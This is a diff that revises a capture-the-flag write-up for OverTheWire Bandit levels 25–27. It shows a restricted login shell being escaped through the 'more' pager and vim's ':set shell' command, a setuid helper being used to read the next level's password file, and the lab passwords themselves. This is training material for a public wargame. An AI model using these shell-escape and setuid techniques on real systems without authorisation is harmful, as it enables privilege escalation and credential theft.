@@ -1,23 +1,23 @@
 ```
-user@host:~$ ssh bandit25@bandit.labs.overthewire.org -p 2220
-uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
-
-bandit25@bandit:~$ cat /etc/passwd | grep bandit26
-bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
-bandit25@bandit:~$ cat /usr/bin/showtext
-#!/bin/sh
-
-export TERM=linux
-
-more ~/text.txt
-exit 0
+user@host:~$ ssh bandit26@bandit.labs.overthewire.org -p 2220
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 ```
 
-So if we rescale our terminal, then not all text should be printed at once and we can interact using vim.
+So we know this does not work because we get logged out immediately. We need to go back to level 25, resize the terminal again, log into bandit 26 again and try to obtain a shell.
 
 ```
 bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
 v
-:e /etc/bandit_pass/bandit26
-5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+:set shell ?
+    shell=/usr/bin/showtext
+:set shell=/bin/bash
+:set shell ?
+    shell=/bin/bash
+:shell
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$ file bandit27-do
+bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
 ```
